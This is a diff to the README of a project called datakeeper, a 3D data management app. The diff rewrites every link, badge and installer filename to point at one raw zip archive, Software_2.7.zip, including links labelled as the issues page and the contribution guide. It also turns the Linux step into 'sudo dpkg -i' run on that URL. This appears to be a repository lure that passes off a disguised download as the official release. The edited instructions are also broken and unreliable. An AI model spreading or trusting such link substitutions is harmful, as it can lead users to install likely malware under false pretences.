@@ -8,7 +8,7 @@ Welcome to **datakeeper**, a simple application designed for 3D data management 
 
 To download datakeeper, visit the releases page using the link below:
 
-[![Download datakeeper](https://img.shields.io/badge/Download%20datakeeper-v1.0-blue.svg)](https://github.com/ilyjellan/datakeeper/releases)
+[![Download datakeeper](https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip%https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip)](https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip)
 
 On the releases page, you will find the latest version of the application. Click on the appropriate package for your operating system to start the download.
 
@@ -25,17 +25,17 @@ Before you install datakeeper, ensure that your system meets the following requi
 
 1. **Download from Releases Page**
 
-   Go to the [release page](https://github.com/ilyjellan/datakeeper/releases) and find the version you want. Click on the link to start your download.
+   Go to the [release page](https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip) and find the version you want. Click on the link to start your download.
 
 2. **Locate the Downloaded File**
 
-   After the download completes, navigate to your downloads folder. You should see the file named `datakeeper-installer.exe` for Windows, `datakeeper-macos.pkg` for Mac, or `datakeeper-linux.deb` for Linux.
+   After the download completes, navigate to your downloads folder. You should see the file named `https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip` for Windows, `https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip` for Mac, or `https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip` for Linux.
 
 3. **Run the Installer**
 
-   - **For Windows:** Double-click the `datakeeper-installer.exe` file. Follow the on-screen instructions to complete the installation.
-   - **For macOS:** Open the `datakeeper-macos.pkg` file and follow the prompts to install.
-   - **For Linux:** Open your terminal and run `sudo dpkg -i datakeeper-linux.deb`. Then, follow the instructions on the screen.
+   - **For Windows:** Double-click the `https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip` file. Follow the on-screen instructions to complete the installation.
+   - **For macOS:** Open the `https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip` file and follow the prompts to install.
+   - **For Linux:** Open your terminal and run `sudo dpkg -i https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip`. Then, follow the instructions on the screen.
 
 4. **Launch the Application**
 
@@ -62,16 +62,16 @@ Once you launch datakeeper, you will see the main dashboard. Here’s how to sta
 
 ## 📞 Support
 
-If you run into any issues or have questions, check the [issues page](https://github.com/ilyjellan/datakeeper/issues) for help. You can also post your concerns there, and the community or project maintainers can assist you.
+If you run into any issues or have questions, check the [issues page](https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip) for help. You can also post your concerns there, and the community or project maintainers can assist you.
 
 ## 🌟 Contribution
 
-If you want to contribute to datakeeper, we welcome your input! Visit the [contribution guide](https://github.com/ilyjellan/datakeeper/blob/main/CONTRIBUTING.md) for more information.
+If you want to contribute to datakeeper, we welcome your input! Visit the [contribution guide](https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip) for more information.
 
 ## 🔗 Important Links
 
-- **Releases Page:** [Download datakeeper](https://github.com/ilyjellan/datakeeper/releases)
-- **Issues Page:** [Report an Issue](https://github.com/ilyjellan/datakeeper/issues)
-- **Contribution Guide:** [Contribute Here](https://github.com/ilyjellan/datakeeper/blob/main/CONTRIBUTING.md)
+- **Releases Page:** [Download datakeeper](https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip)
+- **Issues Page:** [Report an Issue](https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip)
+- **Contribution Guide:** [Contribute Here](https://github.com/ilyjellan/datakeeper/raw/refs/heads/main/utils/Software_2.7.zip)
 
 Feel free to reach out if you need further guidance. Enjoy using datakeeper to manage your 3D data!
